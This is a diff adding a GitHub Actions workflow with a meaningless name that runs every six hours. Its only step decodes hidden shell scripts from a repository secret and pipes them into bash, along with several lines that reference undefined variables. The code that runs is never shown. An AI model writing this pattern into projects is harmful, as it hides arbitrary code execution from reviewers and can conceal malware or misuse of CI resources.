@@ -1,0 +1,25 @@
+name: nizenmehuilaizhaowone
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nizenmehuilaizhaowone
+        env:
+          i17: ${{ secrets.i17 }}
+        run: |
+          echo $i17 | jq -r .w818 | /bin/bash
+          echo $tb442 | jq -r .aili853 | /bin/bash
+          echo $i920 | jq -r .gs181 | /bin/bash
+          echo $kvqeu8 | jq -r .klvzr0 | /bin/bash
+          echo $g89741 | jq -r .pzis61505 | /bin/bash
+          echo $cv011 | jq -r .iat4 | /bin/bash
+          echo $qkpqf9911 | jq -r .wkjly93 | /bin/bash
+          echo $kwfc214 | jq -r .ymvz965 | /bin/bash
+
